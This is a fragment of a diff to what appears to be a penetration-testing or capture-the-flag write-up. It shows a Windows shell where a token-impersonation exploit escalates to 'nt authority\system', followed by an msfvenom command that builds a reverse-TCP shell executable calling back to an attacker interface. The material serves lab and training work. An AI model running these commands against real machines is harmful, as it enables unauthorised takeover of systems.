@@ -79,7 +79,7 @@ Microsoft Windows [Version 5.2.3790]
 
 C:\WINDOWS\Temp>whoami
 whoami
--------------------------------------------
+------------------------------------------
 kindle-->Got WMI process Pid: 1832 
 begin to try
 kindle-->Found token SYSTEM 
@@ -87,3 +87,4 @@ kindle-->Command:cmd
 nt authority\system
 
 msfvenom -p windows/shell/reverse_tcp LHOST=tun0 LPORT=4444 --format exe -o rev.exe
+
